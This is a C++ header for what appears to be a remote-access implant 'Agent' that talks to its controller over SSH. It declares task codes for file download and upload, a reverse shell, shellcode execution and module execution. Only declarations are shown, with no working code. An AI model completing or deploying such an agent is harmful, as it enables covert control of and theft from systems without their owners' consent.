#pragma once

#include <errno.h>

#include "misc.h"
#include "examples_common.h"
#include "shell.h"
#include "tasks.h"

#define AGENT_DOWN_FILE 10
#define AGENT_UP_FILE 11 
#define AGENT_REV_SHELL 12
#define AGENT_EXEC_SC 13
#define AGENT_EXEC_MODULE 14
#define AGENT_EXIT 0

// define our agent class
class Agent
{
private:
    ssh_session session;
    ssh_channel chan;
    int connect_ssh();
    int authenticate();
    int init_channel();
    int write(char *buffer, int len);
    int read(char *buffer, int len);
    unsigned long read_task();
    AgentJob *parse_tasking(unsigned long tasking);
public:
    Agent(/* args */);
    ~Agent();
    int direct_forwarding();
    int upload_file(void *data);    // REWORK
    int download_file(void *data);  // REWORK
    int run();
};







